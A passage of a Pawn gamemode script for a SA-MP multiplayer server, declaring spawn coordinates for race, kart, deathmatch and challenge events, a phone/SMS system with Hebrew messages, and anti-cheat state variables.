{52.3274,2500.3562,16.4844}, 
{34.2155,2502.4924,16.4844}, 
{84.8110,2506.4153,18.4438}, //WarRandomSpawn 6
{167.6369,2506.9700,16.4844}, //WarRandomSpawn 7
{81.8166,2479.7197,32.6381}, 
{76.6413,2482.6677,24.2397}, 
{67.9842,2487.0759,16.4844}, 
{52.3274,2500.3562,16.4844}, 
{34.2155,2502.4924,16.4844}, 
{84.8110,2506.4153,18.4438}, //WarRandomSpawn 6
{167.6369,2506.9700,16.4844} //WarRandomSpawn 7
 };
#define P_OFFSET    3





//


forward weaponanti(playerid);
new AntiOff;
//---
/*
new Bots[][24] = {
{"Carl"},
{"Rocky"},
{"Pepe"},
{"Arnoldo"},
{"SgtPepper"},
{"Pepsi"},
{"Pepno"},
{"Azucar"},
{"Vino_Toro"},
{"Zoquete"},
{"Pacman"},
{"Batman"},
{"AquilesBrinco"},
{"Manfrey"},
{"Papirola"},
{"Sopapeala"},
{"Lavis[MT]"},
{"[MT]Lavis"},
{"Labrik[VIP]"},
{"[ViP]Labrik"},
{"Sony"} };
*/
#define COLOR_BGREEN 0x08FD04FF


//AT-400

#define CYAN 0x99FFFFAA
#define BLUE1 0x00FFFFAA
#define BLUE2 0x09DF6FF
#define RED 0xFF0000AA
#define RED2 0xAA3333AA
#define GREEN 0x33FF33AA
#define WHITE 0xFFFFFFAA
#define ORANGE 0xFF9900AA
#define BLACK 0x00000000
#define LIGHTBLUE 0x33CCFFAA
#define LIGHGREENS 0x0F66AFF
#define MyColor 0x0B6F6FF

//=====================================News=====================================

//---
#define DEAD_TIMER_ID -666
#define LIBRE 0
#define ESTA_LLAMANDO 1
#define LO_ESTAN_LLAMANDO 2
#define ESTA_HABLANDO 3
#define PRECIO_FICHA 2
#define DIST 20.0
//-----------------------
new CellState[MAX_PLAYERS];
new AuxiliarTel[MAX_PLAYERS];
new CellTime[MAX_PLAYERS];
new TimerLLamando[MAX_PLAYERS]={DEAD_TIMER_ID,...};
new TimerCaidaFicha[MAX_PLAYERS]={DEAD_TIMER_ID,...};
new Numero_Tel[MAX_PLAYERS];
//Memoria telefono ---------------------
enum Memory_slot_salida{
	numero_telefono,
	Nombre[MAX_PLAYER_NAME],
	costo
	};
new MemorySalida[MAX_PLAYERS][5][Memory_slot_salida];

enum Memory_slot_entrada{
	numero_telefono2,
	Nombre2[MAX_PLAYER_NAME]
	};
new MemoryEntrada[MAX_PLAYERS][5][Memory_slot_entrada];
//Memoria SMS ---------------------
enum sms_slot_enviados{
	numeroSMS1,
	NombreSMS1[MAX_PLAYER_NAME],
	SMS1[120]
	};
new SMSEnviados[MAX_PLAYERS][5][sms_slot_enviados];
enum sms_slot_recibidos{
	numeroSMS2,
	NombreSMS2[MAX_PLAYER_NAME],
	SMS2[120]
	};
new SMSRecibidos[MAX_PLAYERS][5][sms_slot_recibidos];
//-----------------------
forward ColgarTelefonino(playerid);
forward Llamando(callerid,receiverid);
forward CaidaDeFicha(playerid);
//-----------------------
public CaidaDeFicha(playerid)
{
    CellTime[playerid]++;
    if (CellTime[playerid]*PRECIO_FICHA>GetPlayerMoney(playerid))
    {
        OnPlayerCommandText(playerid,"/Hangup");

    }
}
//-----------------------
msgInfo(playerid,text[])
{
	new msg[255];
    format(msg,255,"%s",text);
    SendClientMessage(playerid, red, msg);
    return 1;
}

//=[GetDP]=========================================================
stock Float:GDTP(playerid,Float:x2,Float:y2,Float:z2)
{
if (IsPlayerConnected(playerid))
{
new Float:x1,Float:y1,Float:z1;
GetPlayerPos(playerid,x1,y1,z1);
return floatsqroot(floatpower(floatabs(floatsub(x2,x1)),2)+floatpower(floatabs(floatsub(y2,y1)),2)+floatpower(floatabs(floatsub(z2,z1)),2));
}
return 9999.9;
}
//-----------------------
AlTelefono(playerid,text[])
{
    new msg[255];
    format(msg,255,"[Phone] %s",text);
    SendClientMessage(playerid, COLOR_YELLOW, msg);
    return 1;
}
//-----------------------

//-----------------------
public Llamando(callerid,receiverid)
{
	if ((!IsPlayerConnected(receiverid))&&(IsPlayerConnected(callerid)))
	{

	    if  (TimerLLamando[callerid]!=DEAD_TIMER_ID)
	    {
	    	KillTimer(TimerLLamando[callerid]);
	    	TimerLLamando[callerid]=DEAD_TIMER_ID;
	    	TimerLLamando[receiverid]=DEAD_TIMER_ID;
	    	CellState[callerid]=LIBRE;
	    	CellState[receiverid]=LIBRE;
		}
		return 1;
	}
	if ((IsPlayerConnected(receiverid))&&(!IsPlayerConnected(callerid)))
	{

	    if  (TimerLLamando[receiverid]!=DEAD_TIMER_ID)
	    {
	    	KillTimer(TimerLLamando[receiverid]);
	    	TimerLLamando[callerid]=DEAD_TIMER_ID;
	    	TimerLLamando[receiverid]=DEAD_TIMER_ID;
	    	CellState[callerid]=LIBRE;
	    	CellState[receiverid]=LIBRE;
		}
		return 1;
	}
	if ((!IsPlayerConnected(receiverid))&&(!IsPlayerConnected(callerid)))
	{
	    if  (TimerLLamando[callerid]!=DEAD_TIMER_ID)
	    {
	    	KillTimer(TimerLLamando[callerid]);
		}
  		if  (TimerLLamando[receiverid]!=DEAD_TIMER_ID)
	    {
	    	KillTimer(TimerLLamando[receiverid]);
		}
		TimerLLamando[callerid]=DEAD_TIMER_ID;
 		TimerLLamando[receiverid]=DEAD_TIMER_ID;
 		CellState[callerid]=LIBRE;
  		CellState[receiverid]=LIBRE;
  		return 1;
	}
	if  ((CellState[callerid] == ESTA_LLAMANDO)&&(CellState[receiverid] == LO_ESTAN_LLAMANDO))
	{
		new msg[256];
		new callerName[MAX_PLAYER_NAME];


	    GetPlayerName(callerid, callerName, sizeof(callerName));
		format(msg, sizeof(msg),"/phonehelp :מתקשר אלייך! | לעזרה %s השחקן",callerName);
		SendClientMessage(receiverid,lblue, msg);
		new Float:x1,Float:y1,Float:z1;
		GetPlayerPos(receiverid,x1,y1,z1);

		return 1;
	}
	return 1;
}

//=[Phoneinfo]=============================================
public ColgarTelefonino(playerid)return SetPlayerSpecialAction(playerid,SPECIAL_ACTION_STOPUSECELLPHONE);
//=[New`s]====================================================
//Other:
new spamkick[MAX_PLAYERS];
new antispam[MAX_PLAYERS];
new TheWeed[MAX_PLAYERS];
new helpme[MAX_PLAYERS];
new sam22[MAX_PLAYERS];
new sam33[MAX_PLAYERS];
new sam44[MAX_PLAYERS];
new ThePetsInYou[MAX_PLAYERS];
new TorYou[MAX_PLAYERS];
new SharkYou[MAX_PLAYERS];
new DolpYou[MAX_PLAYERS];
new PetInWar[MAX_PLAYERS];
new isafk[MAX_PLAYERS];
new Ignore[MAX_PLAYERS][MAX_PLAYERS];
new MoneyWinnerKart;
new MoneyWinnerMonster;
new MoneyWinnerWar;
new MoneyWinnerMini;
new cancelpm[MAX_PLAYERS];
new RaceCP[MAX_PLAYERS];
new IFraceOn;
new RacePlayers;
new Youregisterrace[MAX_PLAYERS];
new WinnerRace;
new RaceEnd;
new EndSytems;
new DriftCP[MAX_PLAYERS];
new IFDriftOn;
new DriftPlayer;
new YouRegister[MAX_PLAYERS];
new WinnerDrift;
new DriftEnd;
new UnSystems;
new RunSystemon;
new RunPlayers;
new Registertrs[MAX_PLAYERS];
new RunSystemend;
new CPTriatlon[MAX_PLAYERS];
new EndSystemTriatlon;

new BikeOn;
new CountBiker;
new BikePlayers;
new InBike[MAX_PLAYERS];
new BikeWinner;
//=[Challenge]=================
//=====================================NeChaStart=====================================
#define MinChaPlayers 1
new ChaOn;
new InCha[MAX_PLAYERS];
new ChaPlayers;
new Chaadminsname[MAX_PLAYER_NAME];
new CountChallenge;
new ChaNoobs;
new CountChallengeFuc;
new ChaPras;
new kboobcha[256];
new ChaWinner;
new CHATIME;
new CHASECX;
new ChaStart;
new PChain[MAX_PLAYERS];
#define CHA_OBJECT 90
new CheDelObject[CHA_OBJECT];
//=============================Random Cha Spawns================================




new Float:ChaSpawn[][3] = {
{1776.5786,-2449.8689,13.5547}, //ChaRandomSpawn 1
{1776.5786,-2449.8689,13.5547}, //ChaRandomSpawn 2
{1764.3571,-2451.1267,13.5547}, //ChaRandomSpawn 3
{1761.9210,-2456.7336,13.5547}, //ChaRandomSpawn 4
{1764.8960,-2460.2324,13.5547}, //ChaRandomSpawn 5
{1766.5360,-2460.2256,13.5547}, //ChaRandomSpawn 6
{1769.2766,-2460.3574,13.5547}, //ChaRandomSpawn 7
{1771.8152,-2463.4224,13.5547}, //ChaRandomSpawn 8
{1770.2825,-2466.7163,13.5547}, //ChaRandomSpawn 9
{1775.1627,-2468.1580,13.5547}, //ChaRandomSpawn 10
{1774.8768,-2469.8367,13.5547}, //ChaRandomSpawn 11
{1781.6393,-2468.0876,13.5547}, //ChaRandomSpawn 12
{1789.9117,-2462.4084,13.5547}, //ChaRandomSpawn 13
{1793.7194,-2457.6177,13.5547}, //ChaRandomSpawn 14
{1794.2030,-2451.3013,13.5547}, //ChaRandomSpawn 15
{1788.0260,-2444.2678,13.5547}, //ChaRandomSpawn 16
{1782.4506,-2442.1667,13.5547}, //ChaRandomSpawn 17
{1761.5686,-2464.7275,13.5547}, //ChaRandomSpawn 18
{1761.6018,-2468.7795,13.6527}, //ChaRandomSpawn 19
{1772.0103,-2471.7104,13.6527},
{1774.8865,-2475.2209,14.1161},
{1779.6394,-2477.5469,14.3361},
{1787.7645,-2475.3965,14.4341},
{1793.6322,-2473.7068,14.4341},
{1798.6202,-2461.1741,14.5314}
};
//=[Yup`s]=======================
//enum e_STATE
//{
//e_STATE_NONE,e_STATE_CONNECTED,e_STATE_UPDATING
//}
//new gLastUpdate[MAX_PLAYERS],e_STATE:gState[MAX_PLAYERS] = {e_STATE_NONE, ...};
//#define MAX_AFK_TIME (2000)

//forward KickUpdate();
new Sagebir[MAX_PLAYERS];
//new Text:Textdraw1;
//==[ChangeHostName]=======================
//new changehn = 1;
//forward AutoChangeHN();
//==[LACY]===================================
#define SHOW_KICK_REASON true
// Money Cheat
#define MONEY_CHEAT_USE true
#define MONEY_CHEAT_TIMER 2000
#define MONEY_CHEAT_MIN 3000000
#define MONEY_CHEAT_WARNINGS 1
#define MONEY_CHEAT_PUNISH 2
// colors
#define COLOR_ADMIN_MESSAGE 0x283669FF
#define COLOR_REASON 0x6699FFFF
#define COLOR_BAN_MESSAGE 0x68FFCBFF
#define COLOR_KICK_MESSAGE 0x68FFCBFF
//16165A
#if MONEY_CHEAT_USE
new moneycheat_warnings[MAX_PLAYERS][2];
new moneycheat_lastamount[MAX_PLAYERS];
new money[MAX_PLAYERS];
#endif

new Kicked[MAX_PLAYERS];

forward moneycheat_check();
forward weapons_check();
forward crasfly_check();
forward carsfly_check();
forward CheckPlayerForGodMod(playerid, num);
forward CheckPlayerForAntiFreeze(playerid, num);
new InCall[MAX_PLAYERS];
new fuxm[256];

//=====================================News=====================================
#define MinMPlayers 1
new KartOn;
new InKart[MAX_PLAYERS];
new KartPlayers;
new Countk;
new knoobk;
new caridxx[MAX_PLAYERS];
new CountFuck;
new KartWinner;
new KCheckTime;
new KCheckSec;
new KS;
new KK[MAX_PLAYERS];
new Fuck[MAX_PLAYERS];
new Kart_Var[200];





new Float:KartRandom[29][4] = {
{2045.9303,-2049.9287,34.2994,90.1279},
{2045.9172,-2044.9489,34.7632,90.1279},
{2045.9124,-2042.4591,34.3148,90.1279},
{2045.8986,-2037.4043,34.9980,90.1279},
{2045.8926,-2034.2059,34.2991,90.1280},
{2045.8868,-2031.6162,34.2992,90.1280},
{2045.8760,-2027.6602,34.6899,90.1280},
{2045.8700,-2025.6823,34.3130,90.1271},
{2045.8623,-2022.2391,34.3131,90.1271},
{2045.8485,-2015.9630,34.2924,90.1266},
{2045.8408,-2012.5200,34.2926,90.1266},
{2045.8235,-2004.0240,34.2916,270.1117},
{2045.8098,-1996.9650,34.2868,270.1011},
{2045.7993,-1990.6934,34.3136,270.1032},
{2039.1606,-1990.7051,34.9930,270.1031},
{2032.5118,-1999.7729,35.6714,270.1031},
{2028.3286,-2009.0026,34.2996,130.0509},
{2027.8030,-2026.4991,34.2996,184.4638},
{2028.9457,-2041.1438,34.2996,184.4700},
{2029.2947,-2045.6097,34.2996,184.4837},
{2019.2673,-2048.4565,34.2996,88.3974},
{2016.4667,-2041.9229,34.2671,80.8203},
{2017.2600,-2034.6659,36.9404,80.8203},
{2018.0189,-2029.9667,37.1348,80.8203},
{2018.0189,-2029.9667,37.1348,80.8203},
{2019.0048,-2023.8666,37.1030,80.8203},
{2020.7023,-2013.3564,37.4386,80.8203},
{2023.0619,-1998.7504,37.7529,80.8203},
{2025.1102,-1986.0695,38.1501,80.8203}
};

//new Fucs;
#define lblueGREEN 0x0F66FFF
//=============================Random War Spawns================================
/*
new Float:MSpawns[][4] = {
{2036.9590,-2051.4177,34.2933,0.4739},
{2033.2308,-2051.4561,34.2930,2.1323},
{2029.4988,-2051.5254,34.2993,359.7239},
{2025.8297,-2051.4551,34.3020,1.0430},
{2022.4489,-2051.4038,34.2996,0.0786},
{2037.2677,-1982.5828,34.2990,178.3861},
{2033.5426,-1982.6451,34.2999,179.1564},
{2030.0575,-1982.6620,34.2995,179.5516},
{2026.4871,-1982.7484,34.2992,181.7884},
{2022.6494,-1982.8328,34.2990,179.7178}
};
*/

//=====================================News=====================================
#define MiNmOnsterPlayers 1
new MonsterOn;
new iNmOnster[MAX_PLAYERS];
new MonsterPlayers;
new MonsterCount;
new MonNoob;
new CountMoneterfu;
new MonsterFux[256];
new MonsterWinner;
new MCheckTimeMonster;
new MoOn;
new KcheckMonster;
new MonsterNoTeleportion[MAX_PLAYERS];
new MonsterFucker[MAX_PLAYERS];
new MonsterSYSTEM[MAX_PLAYERS];
new MonStart[MAX_PLAYERS];
new Monster_Var[200];
new Float:MonsterRandom[30][4] = {
	{ -1281.1554, 994.8486, 1037.6104, 88.3429 },
	{ -1282.0687, 987.9168, 1037.5026, 80.9241 },
	{ -1281.3506, 1001.1743, 1037.7189, 96.1026 },
	{ -1282.8987, 1009.0059, 1037.8527, 107.3637 },
	{ -1286.0485, 1015.5355, 1037.9691, 116.0817 },
	{ -1505.6598, 1021.6973, 1038.4505, 227.5877 },
	{ -1495.2828, 1032.7757, 1038.6156, 220.4797 },
	{ -1283.6548, 981.624, 1037.3925, 70.7936 },
	{ -1286.3497, 975.3618, 1037.3009, 58.5153 },
	{ -1290.1001, 969.6478, 1037.2069, 57.164 },
	{ -1294.9491, 1027.7661, 1038.1846, 138.9463 },
	{ -1294.0604, 964.0651, 1037.1164, 47.944 },
	{ -1298.9483, 959.2191, 1037.0499, 39.9045 },
	{ -1304.2948, 955.2288, 1036.991, 35.7058 },
	{ -1500.9487, 1027.1394, 1038.5323, 228.9902 },
	{ -1514.8537, 993.9699, 1038.012, 272.7786 },
	{ -1482.4313, 1041.9403, 1038.7481, 210.1206 },
	{ -1511.5805, 979.0001, 1037.7557, 289.6034 },
	{ -1508.5096, 971.9116, 1037.6334, 301.1151 },
	{ -1289.7208, 1021.0579, 1038.0678, 124.5565 },
	{ -1300.5868, 1032.2583, 1038.2734, 144.2774 },
	{ -1489.1873, 1037.6508, 1038.6903, 213.7796 },
	{ -1307.5302, 1036.6835, 1038.3592, 152.1656 },
	{ -1514.4672, 1001.7064, 1038.1322, 263.1411 },
	{ -1512.6346, 1008.9055, 1038.2487, 249.2474 },
	{ -1513.658, 986.5009, 1037.8825, 281.8439 },
	{ -1509.725, 1015.5227, 1038.3507, 243.3453 },
	{ -1503.3624, 965.1447, 1037.5095, 317.9805 },
	{ -1477.1889, 1044.7204, 1038.7884, 203.0258 },
	{ -1469.1869, 1047.9875, 1038.8229, 202.8518 }
};

//=
new Flayeri[MAX_PLAYERS];
new aDoing[MAX_PLAYERS];
new aDoingSoon[200],hitman[200];
/*
//=[AFKicker]==========================================
//new`s:
new Float:AFKPos[MAX_PLAYERS][6];
//define:
#define AFK_TIMES 					120
*/
//=[AntiFake]==========================================
new FakeKill[MAX_PLAYERS];
//=[Ks]================================================
new PlayerKills[MAX_PLAYERS];
new MoneyKillOnPlayer[MAX_PLAYERS];
//=[TextMovie]==========================================
new
Text:Box1,
Text:Box2;
//=/NoMore/============================================
//new NoMoreObject[MAX_PLAYERS];
//=/Camrea/============================================
new CamreaRandom;
//=/AirStrike/==========================================
new AirStrikeTil[MAX_PLAYERS];
new AirStrikeTil2[MAX_PLAYERS];
new AirStrikeTil3[MAX_PLAYERS];
new AirStrikeExplodes[MAX_PLAYERS];
new AirStrikeInWar[MAX_PLAYERS];
new Explodeion[MAX_PLAYERS];
new Float:airstrikex,Float:airstrikey,Float:airstriakez;
//=[Drift Private]========================================
new driftwinner[MAX_PLAYERS]=0;
new DriftInvite[MAX_PLAYERS]=0;
new IfInvite[MAX_PLAYERS] = 0;
new PrivateCP[MAX_PLAYERS] = 0;
new DriftNoNow = 0;
new indrift[MAX_PLAYERS];
//=[InDm]===============================================
new InDM[MAX_PLAYERS];
new WeaponDM[MAX_PLAYERS];


new Float:ADM[][4] =
{
{-1418.1343,497.1724,3.0391,285.5537},
{-1404.9812,505.2961,3.0391,296.5205},
{-1384.4587,502.9599,3.0391,263.3068},
{-1372.6217,498.6784,11.1953,324.0940},
{-1363.4025,498.3367,11.2027,268.0302},
{-1349.5909,498.9289,11.1953,271.1636},
{-1339.4823,505.9259,18.2344,276.8036}
};
new Float:DMPostion[][3] =
{
{2613.9866,	2848.4475,	19.9922},{2647.6553,	2805.0278,	10.8203},
{2611.5500,	2845.7542,	16.7020},{2545.9243,	2839.1824,	10.8203},
{2672.9387,	2800.3374,	10.8203},{2672.8306,	2792.1057,	10.8203},
{2647.7834,	2697.5884,	19.3222},{2654.5427,	2720.3474,	19.3222},
{2653.2063,	2738.2432,	19.3222},{2685.8875,	2816.6575,	36.3222},
{2641.1350,	2703.2019,	25.8222},{2599.1304,	2700.7249,	25.8222},
{2606.1384,	2721.5237,	25.8222},{2597.3745,	2748.0884,	23.8222},
{2595.0657,	2776.6729,	23.8222},{2601.3640,	2777.8101,	23.8222},
{2584.3940,	2825.1748,	27.8203},{2631.8110,	2834.2593,	40.3281},
{2632.2852,	2834.9390,	122.9219},{2646.1997,	2817.7070,	36.3222},
{2691.1233,	2787.7883,	59.0212},{2717.8071,	2771.3464,	74.8281},
{2695.2622,	2699.5488,	22.9472},{2688.8206,	2689.0039,	28.1563},
{2655.0229,	2650.6807,	36.9154},{2570.4668,	2701.2876,	22.9507},
{2498.9915,	2704.6204,	10.9844},{2524.1584,	2743.3735,	10.9917},
{2498.3167,	2782.3357,	10.8203},{2504.5142,	2805.9763,	14.8222},
{2522.2144,	2814.7087,	24.9536},{2510.6292,	2849.6384,	14.8222},
{2618.2646,	2720.8005,	36.5386},{2690.9980,	2741.9060,	19.0722},
{2544.5032,	2805.8840,	19.9922},{2556.2554,	2832.5313,	19.9922},
{2561.9175,	2848.5532,	19.9922}
};
//=[WDM]==================





new Float:WDMPostion[][3] =
{
{3630.1313,-104.4491,2.3431},
{3628.5081,-66.6831,2.8118},
{3601.1018,-71.4960,2.4314},
{3567.3330,-68.2967,4.3663},
{3570.0867,-33.9868,2.7574},
{3574.7959,-31.6476,2.7947},
{3580.2722,-6.7231,3.1798}
};
//=
new file[256];
///=[NmClan]============================================

new NM2,NM1,
NM3;

new Move1;
new Move2;

//=[IDF]=
new Move3;
new Move4;
//=[HM]=
new Move7;
//=[seq]
new Move5;
new Move6;

new AnsTrivia1;
new MaxAns[MAX_PLAYERS];
new TriviaOn =0;
new InTheServer;
//==[];
//==
/*

new Text:TextLevel;
new Text:TextBank;
new Text:TextKills;
new desting[256],desting2[256],desting3[256];
*/


new AirBreakVar[MAX_PLAYERS];
new SetDistance[MAX_PLAYERS];
forward AfterPlayerConnect(playerid);
forward OnGetPlayerKeys();
new BankShipOn[MAX_PLAYERS];
new AtBank[MAX_PLAYERS];

new Spectatorl[MAX_PLAYERS];
//=[Hasbon]=======
forward Maths();

new answer;
new answered;
new score;

//=[JumpKill]================
#define OVERALLFILE "JumpHighscores.cfg"
#define PERSONALFILE "PersonalJumpHighscores.cfg"
#define DEFAULT_BIKEMODEl 522   //NRG-500

new TimerJumpkill1, TimerJumpkill2, TimerJumpkill3, MaxTimer;
new RaceJumpKill = -1;
new Motor;
new DestroyPlayerObject2[45];
new Float:HS[3], HSN[3][MAX_PLAYER_NAME];
new LasttmpX;
new Countkilljump;
new TimeLeft;
new Float:Distance;
new BikeModel = DEFAULT_BIKEMODEl;
//==[Spsps]
#define Hq1 "TesT"
#define COLOR_WHITE 0xFFFFFFAA
#define green	0x16EB43FF
//#define COLOR_BRIGHTRED 0xDC143CAA
#define COLOR_KRED 0xFF0000FF
#define COLOR_ORANGE 0xFF9900AA

//=================HQ Gates===================
//new Hq1_Gate1,Hq1_Gate2;
//
new InviteClanName[MAX_PLAYERS][256];

new iname[MAX_PLAYER_NAME];
new strings[256];
new IsInvited[MAX_PLAYERS];
new ClanMute[200];
//=[RacesCity]==========================================
//------------------------------------------------------------------------
new CityRaceingOn;
new CountCityRaceingr;
new CityRaceingPlayers;
new InCityRaceing[MAX_PLAYERS];
new InCityRaceing2[MAX_PLAYERS];

//new CityRaceingWinner;




new CityCP[MAX_PLAYERS];
new Float:CityCPs[][] = {
	{ -2681.6155, 1385.0377, 55.7396 },
	{ -2681.4651, 1919.1546, 61.0437 },
	{ -2697.7225, 2221.4526, 56.2765 },
	{ -2758.7439, 2388.2363, 74.9199 },
	{ -2712.2029, 2611.9533, 75.4089 },
	{ -2340.6658, 2659.0546, 58.1657 },
	{ -1963.0933, 2533.8989, 55.5418 },
	{ -1852.8233, 2284.8784, 30.2315 },
	{ -1643.6813, 2063.7575, 19.0032 },
	{ -1578.2287, 1749.483, 6.9282 },
	{ -1197.9574, 1644.8741, 14.767 },
	{ -1085.7442, 1330.5146, 30.8293 },
	{ -1179.6747, 1057.9334, 41.0684 },
	{ -1514.8956, 705.8262, 45.533 },
	{ -1737.1293, 476.5994, 38.5402 },
	{ -1877.1519, 204.8157, 38.5435 },
	{ -1905.079, -89.1605, 38.1693 },
	{ -2114.4105, -341.6781, 35.2356 },
	{ -2464.4302, -331.8881, 32.8455 },
	{ -2783.3343, -471.3014, 7.1434 },
	{ -2808.3924, -191.6816, 6.9583 },
	{ -2809.3165, 123.6539, 6.9583 },
	{ -2853.973, 360.5227, 4.2786 },
	{ -2866.8079, 762.6663, 32.1823 },
	{ -2846.2149, 985.1699, 42.8241 },
	{ -2702.8167, 1289.8968, 6.9677 },
	{ -2455.5655, 1378.2169, 6.9661 },
	{ -2463.3711, 1212.3585, 35.013 },
	{ -2641.9666, 1209.1645, 54.9051 },
	{ -2681.938, 1310.6881, 55.3563 }
};
new Player_Var[200];
new Float:RandomCityRace[10][4] = {
	{ -2666.3172, 1289.1536, 55.3568, 0.0299 },
	{ -2666.3172, 1289.1536, 55.3568, 0.0299 },
	{ -2671.3523, 1289.151, 55.3568, 0.0299 },
	{ -2674.3646, 1289.1494, 55.3568, 0.0299 },
	{ -2678.2332, 1289.1474, 55.3568, 0.0299 },
	{ -2681.8919, 1289.1453, 55.4794, 0.0269 },
	{ -2684.8765, 1289.1441, 55.3566, 0.0263 },
	{ -2688.6199, 1289.1427, 55.3568, 0.0263 },
	{ -2692.3455, 1289.1412, 55.3568, 0.0263 },
	{ -2696.232, 1289.1396, 55.3568, 0.0263 }
};

new Float:CityCPs2[16][3] = {
	{ 1797.1652, 827.1301, 10.384 },
	{ 1779.6129, 660.8189, 17.6368 },
	{ 1624.659, 161.5484, 34.6158 },
	{ 1671.3366, -218.6762, 40.7969 },
	{ 1712.7089, -615.1827, 39.2582 },
	{ 1621.2169, -1255.9715, 46.7983 },
	{ 1642.701, -1903.1456, 24.7618 },
	{ 1410.4205, -2130.908, 13.274 },
	{ 1339.2908, -2336.4273, 13.274 },
	{ 1441.4157, -2677.1683, 13.274 },
	{ 1961.9316, -2678.7171, 7.5785 },
	{ 2168.2424, -2491.1146, 13.1021 },
	{ 2364.9228, -2200.4444, 13.274 },
	{ 2830.3005, -2064.8848, 10.8285 },
	{ 2851.205, -1724.3736, 10.774 },
	{ 2887.9311, -1592.2507, 10.7739 }
};

new Float:RandomCityRace2[6][4] = {
	{ 1978.4151, 858.2166, 6.4875, 90.4604 },
	{ 1978.4483, 852.1555, 6.4808, 90.0464 },
	{ 1978.2237, 846.3413, 6.4808, 89.7397 },
	{ 1978.5546, 840.0485, 6.4808, 90.9219 },
	{ 1978.7042, 834.2664, 6.4808, 89.1363 },
	{ 1979.5729, 828.0966, 6.4913, 90.9969 }
};
new Text:Textdraw1;
//=[Gre]
#define MinGrePlayers 1
new GreOn;
new InGre[MAX_PLAYERS];
new GrePlayers;
new Greadminsname[MAX_PLAYER_NAME];
new CountGrellenge;
new GreKnoob;
new CountGrellengeFuc;
new GrePras;
new kboobGre[256];
new GreWinner;
new GreTIME;
new GreSECX;
new GreStart;
new PGrein[MAX_PLAYERS];
//=============================Random Gre Spawns================================
new Float:GreSpawn[][3] = {

	{ 1305.1094, 2174.8198, 11.0234 },
	{ 1305.0904, 2154.8676, 11.0234 },
	{ 1305.239, 2127.6809, 11.0234 },
	{ 1318.2463, 2106.8115, 11.0156 },
	{ 1341.0291, 2107.0363, 11.0156 },
	{ 1354.9804, 2106.8081, 11.0156 },
	{ 1390.6857, 2123.3229, 11.0234 },
	{ 1390.3448, 2147.2246, 11.0234 },
	{ 1394.7436, 2168.6896, 9.7578 },
	{ 1386.8294, 2191.8071, 11.0234 },
	{ 1368.9271, 2196.3488, 9.7578 },
	{ 1351.9296, 2192.507, 11.0234 },
	{ 1335.7751, 2192.5571, 11.0234 },
	{ 1365.8359, 2195.5227, 14.2495 },
{ 1394.6379, 2170.5107, 14.2495 }

 };
 
 //=[AllMapRace]=====
 new AllMapRaceingOn;
new CountAllMapRaceingr;
new AllMapRaceingPlayers;
new InAllMapRaceing[MAX_PLAYERS];

//new AllMapRaceingWinner;



/*
AddPlayerClass(0,,88.3844,0,0,0,0,0,0); // Pos1
AddPlayerClass(0,,135.6982,0,0,0,0,0,0); // Pos2
*/
new AllMapCP[MAX_PLAYERS];

new Float:AllMapCPs[36][3] = {
{2663.2603,-2162.8779,11.1016},
{2311.9941,-2251.9519,13.5469},
{2167.4460,-2480.2273,13.5469},
{2065.4451,-2677.3088,13.5469},
{1587.8610,-2677.1748,6.1103},
{1339.4576,-2544.6758,13.5469},
{1123.1603,-2383.7422,11.5683},
{1044.2079,-2062.0652,13.1484},
{945.8233,-1784.1852,14.0569},
{640.6188,-1740.1395,13.4346},
{350.8199,-1708.4041,6.8493},
{158.0133,-1576.9509,12.4222},
{-17.2107,-1518.1273,1.8273},
{-145.9302,-1287.5613,2.6953},
{-92.7435,-1028.5220,24.1030},
{-378.4472,-838.3062,47.1718},
{-613.1492,-981.4955,64.9986},
{-865.2166,-1060.4891,91.8930},
{-907.8014,-1361.0914,122.8179},
{-1217.8997,-1346.6333,122.8994},
{-1421.3599,-1411.6609,103.4291},
{-1538.8107,-1207.8622,101.9867},
{-1639.6587,-978.0247,101.0047},
{-1751.2981,-938.2677,75.8061},
{-1701.7247,-1117.7870,73.3396},
{-1581.3861,-1228.1173,64.7795},
{-1526.4840,-1412.6379,42.2350},
{-1626.1057,-1375.1642,45.4901},
{-1728.0400,-1198.5731,54.1491},
{-1811.7711,-948.9905,47.5199},
{-1808.2395,-762.1329,32.9688},
{-1818.1310,-580.6351,16.3359},
{-1983.2054,-580.1985,25.9141},
{-2172.1196,-476.6438,45.9903},
{-2255.8079,-347.7184,50.8672},
{-2255.9756,-191.3104,35.1719}
};



new MAP_VAR_PLAYER[200];
new Float:RandomAllMapRace[10][4] = {
	{ -2666.3172, 1289.1536, 55.3568, 0.0299 },
	{ -2666.3172, 1289.1536, 55.3568, 0.0299 },
	{ -2671.3523, 1289.151, 55.3568, 0.0299 },
	{ -2674.3646, 1289.1494, 55.3568, 0.0299 },
	{ -2678.2332, 1289.1474, 55.3568, 0.0299 },
	{ -2681.8919, 1289.1453, 55.4794, 0.0269 },
	{ -2684.8765, 1289.1441, 55.3566, 0.0263 },
	{ -2688.6199, 1289.1427, 55.3568, 0.0263 },
	{ -2692.3455, 1289.1412, 55.3568, 0.0263 },
	{ -2696.232, 1289.1396, 55.3568, 0.0263 }
};




new Float:DM_Hydra[10][4] = {
	{ 107.5308,1904.1121,33.0937},
	{346.7946,2024.0430,22.6406},
	{276.1812,1956.7094,17.6406},
	{146.4306,1902.0352,26.3795},
	{265.7175,1806.6803,33.4978},
	{110.8928,1836.4781,23.3176},
	{274.9425,1989.1729,26.4387},
	{279.4637,1830.0289,21.4766},
	{269.4012,1839.6488,6.5892},
	{247.6331,1800.6151,7.4141}
	};

new aDoing11[200] = 0;
new aDoing1[200] = 0;
new aDoing2[200] = 0;
new aDoing3[200] = 0;
new aDoing4[200] = 0;
new aDoing5[200] = 0;
new shekel[200] = 0;
forward public resetshekel(playerid);


//airattack:
#define VAS 237
#define ZAA 35.0

new Float:AirAttack[200][4];
new AirAttackV[200][VAS];
new KillTimeraa[200];
new Stateaa[200];
new AsLevel[200];
new AirAttackOn[200];

forward public AirAttackStart(playerid);
forward public LaunchZone(playerid);
forward public LaunchZone2(playerid);
forward public LaunchZone3(playerid);
forward public LaunchZone4(playerid);
forward public LaunchZone5(playerid);
forward public DestroyAirAttack(playerid);
forward public ResetTheVar(playerid);

#define bbplace "/bb.ini"
forward public bbshow();
//new bot_can_send_message;
new count_online = 0;
new triamountion[10];

new vote[4] = 0;
new quis[256];
new vote_player[MAX_PLAYERS];
new timers_rule[200][15];

//=[Speedometer]=======================================
forward public CheckStatus();
new PlayerVehicle[212][] =
{
"Landstalker", "Bravura", "Buffalo", "Linerunner", "Perrenial", "Sentinel", "Dumper", "Firetruck", "Trashmaster", "Stretch", "Manana",
